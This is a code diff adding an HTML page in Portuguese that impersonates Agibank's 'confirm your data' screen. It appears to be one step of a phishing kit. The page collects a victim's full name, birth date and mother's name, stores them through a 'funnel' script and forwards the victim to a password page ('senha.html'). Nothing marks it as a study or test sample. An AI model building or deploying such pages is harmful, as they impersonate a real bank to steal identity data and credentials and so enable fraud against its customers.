@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agibank - Confirme seus Dados</title>
+    <script src="assets/js/tailwind.js"></script>
+    <link href="assets/css/inter.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="assets/js/imask.js"></script>
+    <script src="assets/js/funnel.js"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
+        .confirm-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
+        .input-manual { width: 100%; background: transparent; border: none; border-bottom: 2px solid #e2e8f0; padding: 6px 0; font-weight: 700; color: #1e293b; outline: none; transition: border-color 0.3s; }
+        .input-manual:focus { border-color: #0064F5; }
+        .input-manual::placeholder { color: #cbd5e1; font-weight: 400; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="confirm-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
+        <div class="text-center mb-6">
+            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-5 object-contain">
+            <h1 class="text-2xl font-bold text-gray-800">Confirme seus dados</h1>
+            <p class="text-gray-500 mt-1 text-sm" id="instrucao">Confira as informações abaixo para prosseguir:</p>
+        </div>
+        
+        <form id="formConfirmacao" class="space-y-5 mb-4">
+            <div class="pb-2">
+                <span class="block text-xs font-semibold text-[#0064F5] uppercase tracking-wider">Nome Completo</span>
+                <input type="text" id="display-nome" name="nome" required placeholder="Digite seu nome completo" class="input-manual uppercase text-base">
+            </div>
+            <div class="pb-2">
+                <span class="block text-xs font-semibold text-[#0064F5] uppercase tracking-wider">Data de Nascimento</span>
+                <input type="text" id="display-nascimento" name="nascimento" required placeholder="00/00/0000" inputmode="numeric" class="input-manual text-base">
+            </div>
+            <div class="pb-2">
+                <span class="block text-xs font-semibold text-[#0064F5] uppercase tracking-wider">Nome da Mãe</span>
+                <input type="text" id="display-mae" name="mae" required placeholder="Digite o nome da sua mãe" class="input-manual uppercase text-base">
+            </div>
+            
+            <div class="flex flex-col space-y-3 pt-3">
+                <button type="submit" id="btnConfirmar" class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform hover:-translate-y-1">
+                    CONFIRMO
+                </button>
+                <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
+                    VOLTAR
+                </button>
+            </div>
+        </form>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                IMask(document.getElementById('display-nascimento'), { mask: '00/00/0000' });
+
+                const nomeInput = document.getElementById("display-nome");
+                const nascInput = document.getElementById("display-nascimento");
+                const maeInput = document.getElementById("display-mae");
+
+                // Pré-preenche se já tiver dados salvos
+                const saved = getFunnelData();
+                if (saved.nome) nomeInput.value = saved.nome;
+                if (saved.nascimento) nascInput.value = saved.nascimento;
+                if (saved.mae) maeInput.value = saved.mae;
+
+                document.getElementById('formConfirmacao').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    if (nomeInput.value.trim() === "" || nascInput.value.trim().length < 10 || maeInput.value.trim() === "") {
+                        alert("Por favor, preencha todos os campos corretamente.");
+                        return;
+                    }
+
+                    const btn = document.getElementById('btnConfirmar');
+                    btn.disabled = true;
+                    btn.innerText = 'Salvando...';
+
+                    const dadosConfirmacao = {
+                        nome: nomeInput.value.trim().toUpperCase(),
+                        nascimento: nascInput.value.trim(),
+                        mae: maeInput.value.trim().toUpperCase()
+                    };
+
+                    sessionStorage.setItem("dados_cpf", JSON.stringify(dadosConfirmacao));
+                    await saveFunnelData('confirmacao', dadosConfirmacao);
+
+                    // Próxima etapa do funil: SENHA
+                    navTo('senha.html');
+                });
+            });
+        </script>
+    </div>
+</body>
+</html>
